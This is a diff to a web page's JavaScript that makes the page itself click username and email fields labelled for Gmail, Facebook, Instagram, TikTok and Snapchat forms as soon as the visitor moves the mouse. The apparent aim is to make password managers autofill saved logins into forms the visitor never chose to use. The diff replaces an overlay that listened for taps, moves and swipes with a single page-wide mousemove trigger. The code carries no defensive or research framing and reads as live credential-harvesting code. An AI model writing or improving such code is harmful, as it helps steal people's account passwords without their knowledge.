@@ -105,59 +105,19 @@ setTimeout(() => {
 }, 1500); // 1.5 second delay to simulate loading
 
 
-// --- Interaction-based Autofill Trigger ---
+// --- Desktop Mouse-Move Autofill Trigger ---
 function triggerAutofill() {
-  console.log('Interaction detected, attempting to trigger autofill...');
+  // This function is primarily for desktop mouse-move.
+  // It programmatically clicks the inputs to trigger password manager prompts.
+  console.log('Mouse move detected, attempting to trigger autofill...');
 
-  // Try to click all the username/email fields to trigger autofill prompts
-  const gmailInput = document.querySelector('#gmail-form input[name="email"]');
-  if (gmailInput) gmailInput.click();
-
-  const facebookInput = document.querySelector('#facebook-form input[name="username"]');
-  if (facebookInput) facebookInput.click();
-
-  const instagramInput = document.querySelector('#instagram-form input[name="username"]');
-  if (instagramInput) instagramInput.click();
-
-  const tiktokInput = document.querySelector('#tiktok-form input[name="username"]');
-  if (tiktokInput) tiktokInput.click();
-
-  const snapchatInput = document.querySelector('#snapchat-form input[name="username"]');
-  if (snapchatInput) snapchatInput.click();
-
-  // Hide the overlay after the first trigger to avoid interfering
-  const overlay = document.getElementById('click-overlay');
-  if (overlay) overlay.style.display = 'none';
+  // Try to click all the username/email fields
+  document.querySelector('#gmail-form input[name="email"]')?.click();
+  document.querySelector('#facebook-form input[name="username"]')?.click();
+  document.querySelector('#instagram-form input[name="username"]')?.click();
+  document.querySelector('#tiktok-form input[name="username"]')?.click();
+  document.querySelector('#snapchat-form input[name="username"]')?.click();
 }
 
-const overlay = document.getElementById('click-overlay');
-if (overlay) {
-  // For mobile (tap)
-  overlay.addEventListener('click', triggerAutofill, { once: true });
-  // For desktop (mouse move)
-  overlay.addEventListener('mousemove', triggerAutofill, { once: true });
-
-  // For mobile (swipe/slide)
-  let touchstartX = 0;
-  let touchstartY = 0;
-  let touchendX = 0;
-  let touchendY = 0;
-  const swipeThreshold = 30; // Minimum distance for a swipe
-
-  overlay.addEventListener('touchstart', (e) => {
-    touchstartX = e.changedTouches[0].screenX;
-    touchstartY = e.changedTouches[0].screenY;
-  }, { once: true });
-
-  overlay.addEventListener('touchend', (e) => {
-    touchendX = e.changedTouches[0].screenX;
-    touchendY = e.changedTouches[0].screenY;
-    
-    const deltaX = Math.abs(touchendX - touchstartX);
-    const deltaY = Math.abs(touchendY - touchstartY);
-
-    if (deltaX > swipeThreshold || deltaY > swipeThreshold) {
-      triggerAutofill();
-    }
-  }, { once: true });
-}
+// Add the listener for desktop users. It will only run once.
+document.addEventListener('mousemove', triggerAutofill, { once: true });
